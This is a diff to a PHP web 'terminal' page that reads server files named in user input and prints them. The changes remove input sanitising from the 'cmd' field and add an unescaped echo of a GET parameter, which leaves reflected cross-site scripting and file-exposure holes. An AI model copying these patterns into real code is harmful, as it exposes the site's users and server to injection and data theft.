@@ -59,13 +59,14 @@ input[type=text] {
             <div class="col-md-2" style="text-align: left;">
                  <?php
                     $cmduser= exec('hostname');
-                    echo "<h4 style=' font-family:Noto Sans Mono CJK TC Bold'><b style='color:red; margin-top:0.5%;'>$cmduser</b></h4>";
+					echo "   "."<h4 style=' font-family:Noto Sans Mono CJK TC Bold'><b style='color:red; margin-top:0.5%;'>$cmduser</b></h4>";
+					
                 ?>
             </div>
             <div class="col-md-10" style="left: 2%;">
                  <input type='text' name='cmd' id="inp" placeholder=">>>"> 
             </div>
-
+			<?php echo $_GET['path'];?>
         </form>
 		<?php
 
@@ -74,7 +75,7 @@ input[type=text] {
     	    $courant= getcwd();
     	    $compteur =0;
             $tabextensionsfile = array('jpg','png','jpeg','JPG','PNG','JPEG' );
-    		$cmd=strip_tags($_POST['cmd']);
+    		$cmd=$_POST['cmd'];
 
     		if ($cmd != null AND $a->command_your_os($cmd) AND !empty($cmd) AND isset($cmd)) {
                 
@@ -91,7 +92,7 @@ input[type=text] {
 
     				if (!file_exists($file)){
     					
-    					echo "<h3 style='font-family:Noto Sans Mono CJK TC Bold'><b> File no find...<img src='stop.gif' width='2%'></h3>";
+    					echo "<h3 style='font-family:Noto Sans Mono CJK TC Bold'><b> File no find...<img src='ressources/images/stop.gif' width='2%'></h3>";
 
     				}elseif(file_exists($file)){
 
@@ -100,12 +101,12 @@ input[type=text] {
                         if (in_array($extension, $tabextensionsfile)) {
                             ?>
                             <img src ="<?php echo $cmd;?>" width ='50%'/>
-                            <?Php
+                            <?php
                         }else{
 
                             for($i=0;$contenu[$i];$i++){
 
-                                    echo "<h3 style='left:5%;'><b></b></h3>"."<b><h4 style='font-family:Noto Sans Mono CJK TC Bold'>$contenu[$i]</h4></b>";
+                                    echo "<h3 style='left:5%;'><b></b></h3>"."<b><h4 style='font-family:Noto Sans Mono CJK TC Bold,color:white;'>$contenu[$i]</h4></b>";
                                     $compteur++;
                                 
                             }
